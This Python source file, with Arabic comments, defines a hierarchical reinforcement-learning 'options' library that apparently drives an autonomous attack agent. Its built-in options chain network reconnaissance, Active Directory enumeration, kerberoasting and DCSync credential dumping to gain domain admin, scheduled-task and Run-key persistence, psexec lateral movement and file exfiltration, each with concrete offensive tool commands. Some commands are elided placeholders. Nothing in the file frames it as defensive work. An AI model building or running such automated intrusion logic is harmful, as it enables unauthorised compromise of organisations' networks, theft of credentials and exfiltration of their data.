# language: Python, file: core/ai/rl/hrl/options.py
# Options framework (Sutton, Precup, Singh 1999) — temporal abstraction
import numpy as np
import json
import os
from typing import Callable, List, Optional, Dict, Tuple
from dataclasses import dataclass, field
from datetime import datetime


@dataclass
class Option:
    """
    Option = (I, π, β):
      I : initiation set (متى يمكن البدء)
      π : policy داخل الoption (worker)
      β : termination condition (متى ينتهي)
    """
    name: str
    initiation: Callable[[dict], bool]
    policy: Callable[[dict], Tuple[str, dict]]     # action selector
    termination: Callable[[dict], bool]
    target_state: Optional[dict] = None
    max_steps: int = 20
    sub_goals: List[str] = field(default_factory=list)

    # runtime
    entry_state: Optional[dict] = None
    steps_taken: int = 0
    reward_accum: float = 0.0


class OptionLibrary:
    """
    مكتبة options عالية المستوى.
    كل option = سلسلة actions نحو target state.
    """
    def __init__(self):
        self.options: Dict[str, Option] = {}
        self._register_builtins()

    def _register_builtins(self):
        # ── Recon options ──
        self.register(Option(
            name="recon_subnet",
            initiation=lambda s: not s.get("subnet_scanned"),
            policy=self._recon_policy,
            termination=lambda s: s.get("subnet_scanned", False),
            max_steps=10,
            sub_goals=["nmap_scan", "port_enum", "service_id"],
        ))
        self.register(Option(
            name="enumerate_ad",
            initiation=lambda s: s.get("ad_environment") and
                                  not s.get("ad_enumerated"),
            policy=self._enum_ad_policy,
            termination=lambda s: s.get("ad_enumerated", False),
            max_steps=8,
            sub_goals=["nxc_smb", "nxc_ldap", "bloodhound"],
        ))
        self.register(Option(
            name="gain_domain_admin",
            initiation=lambda s: s.get("has_session") and
                                  s.get("ad_environment"),
            policy=self._da_policy,
            termination=lambda s: s.get("has_domain_admin", False),
            max_steps=15,
            sub_goals=["kerberoast", "acl_abuse", "dcsync"],
        ))
        self.register(Option(
            name="establish_persistence",
            initiation=lambda s: s.get("has_session"),
            policy=self._persist_policy,
            termination=lambda s: s.get("persistence_set", False),
            max_steps=6,
        ))
        self.register(Option(
            name="exfiltrate",
            initiation=lambda s: s.get("has_session"),
            policy=self._exfil_policy,
            termination=lambda s: s.get("exfil_done", False),
            max_steps=12,
        ))
        self.register(Option(
            name="lateral_movement",
            initiation=lambda s: s.get("has_session") and
                                  s.get("creds_count", 0) > 0,
            policy=self._lateral_policy,
            termination=lambda s: s.get("new_session_pivoted", False),
            max_steps=10,
        ))

    def register(self, opt: Option):
        self.options[opt.name] = opt

    # ── policies داخل الoptions ──
    def _recon_policy(self, state: dict) -> Tuple[str, dict]:
        phase = state.get("recon_phase", "init")
        if phase == "init":
            return "run_shell", {"cmd": "nmap -sS -sV -T4 <subnet>"}
        if phase == "port":
            return "get_facts", {}
        if phase == "service":
            return "query_cve", {"cve_id": ""}
        return "done", {}

    def _enum_ad_policy(self, state: dict) -> Tuple[str, dict]:
        phase = state.get("enum_phase", "smb")
        if phase == "smb":
            return "run_shell", {"cmd": "nxc smb <dc> --users --shares"}
        if phase == "ldap":
            return "run_shell", {"cmd": "nxc ldap <dc> --groups"}
        if phase == "bh":
            return "run_shell", {"cmd": "bloodhound-python -c All"}
        return "done", {}

    def _da_policy(self, state: dict) -> Tuple[str, dict]:
        phase = state.get("da_phase", "kerb")
        if phase == "kerb":
            return "run_shell", {"cmd": "impacket-GetUserSPNs -request"}
        if phase == "acl":
            return "run_shell", {"cmd": "bloodyAD ..."}
        if phase == "dcsync":
            return "run_shell", {"cmd": "impacket-secretsdump -just-dc"}
        return "done", {}

    def _persist_policy(self, state: dict) -> Tuple[str, dict]:
        phase = state.get("persist_phase", "schtask")
        if phase == "schtask":
            return "dispatch_task", {"sid": "", "task": "schtasks /create ..."}
        if phase == "run_key":
            return "dispatch_task", {"sid": "", "task": "reg add HKCU\\..\\Run"}
        return "done", {}

    def _exfil_policy(self, state: dict) -> Tuple[str, dict]:
        return "exfil_file", {"path": state.get("target_file", "")}

    def _lateral_policy(self, state: dict) -> Tuple[str, dict]:
        phase = state.get("lat_phase", "smb")
        if phase == "smb":
            return "dispatch_task", {"sid": "", "task": "psexec.py ..."}
        if phase == "ssh":
            return "dispatch_task", {"sid": "", "task": "ssh ..."}
        return "done", {}

    # ── initiation set ──
    def applicable(self, state: dict) -> List[Option]:
        return [o for o in self.options.values() if o.initiation(state)]

    def get(self, name: str) -> Optional[Option]:
        return self.options.get(name)


options_lib = OptionLibrary()
